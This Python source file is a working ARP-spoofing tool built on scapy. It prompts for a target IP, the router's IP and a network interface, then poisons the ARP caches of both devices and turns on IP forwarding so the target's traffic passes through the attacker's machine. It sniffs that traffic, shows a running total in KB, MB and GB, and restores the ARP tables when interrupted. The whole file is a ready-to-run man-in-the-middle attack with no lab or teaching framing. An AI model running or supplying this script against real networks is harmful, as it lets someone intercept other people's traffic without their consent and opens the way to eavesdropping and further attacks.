from scapy.all import ARP, send, sr1, sniff, IP, get_if_list
from scapy.layers.inet import TCP, UDP
import os
import time
import threading

TARGET_IP = input("Target IP: ")
GATEWAY_IP = input("IP Router: ")

interfaces = get_if_list()
for i, iface in enumerate(interfaces):
    print(f"{i}: {iface}")
choice = int(input("Choose Your Wifi Card "))
w_lan = interfaces[choice]

usage = 0

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    arp_response = sr1(arp_request, timeout=2, verbose=0)
    if arp_response:
        return arp_response.hwsrc
    else:
        return None

def enable_ip_forwarding():
    os.system("sudo sysctl -w net.ipv4.ip_forward=1")

def disable_ip_forwarding():
    os.system("sudo sysctl -w net.ipv4.ip_forward=0")

def arp_spoof(target_ip, target_mac, spoof_ip):
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip), verbose=0)

def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
             psrc=target_ip, hwsrc=target_mac), count=3, verbose=0)
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
             psrc=gateway_ip, hwsrc=gateway_mac), count=3, verbose=0)

def packet_callback(packet):
    global usage
    if packet.haslayer(IP) and (packet.haslayer(TCP) or packet.haslayer(UDP)):
        if packet[IP].src == TARGET_IP or packet[IP].dst == TARGET_IP:
            usage += len(packet)
            kb = usage / 1024
            mb = kb / 1024
            gb = mb / 1024 
            os.system("clear")
            print(f"ARP: {TARGET_IP}")
            print("-" * 40)
            print(f"   {kb:.2f} KB")
            print(f"   {mb:.2f} MB")
            print(f"   {gb:.4f} GB")
            print("-" * 40)

def spoof_loop(target_ip, gateway_ip):
    while True:
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)
        if target_mac and gateway_mac:
            arp_spoof(target_ip, target_mac, gateway_ip)
            arp_spoof(gateway_ip, gateway_mac, target_ip)
        time.sleep(1)

target_mac = get_mac(TARGET_IP)
gateway_mac = get_mac(GATEWAY_IP)
if not target_mac or not gateway_mac:
    print("Error MAC Address")
    exit(1)

print(f"ARP Spoofing Start{TARGET_IP}")
enable_ip_forwarding()

threading.Thread(target=spoof_loop, args=(TARGET_IP, GATEWAY_IP), daemon=True).start()

try:
    sniff(prn=packet_callback, store=0, iface=w_lan)
except KeyboardInterrupt:
    print("network is normal now...")
    restore_network(GATEWAY_IP, gateway_mac, TARGET_IP, target_mac)
    disable_ip_forwarding()
    print("success")
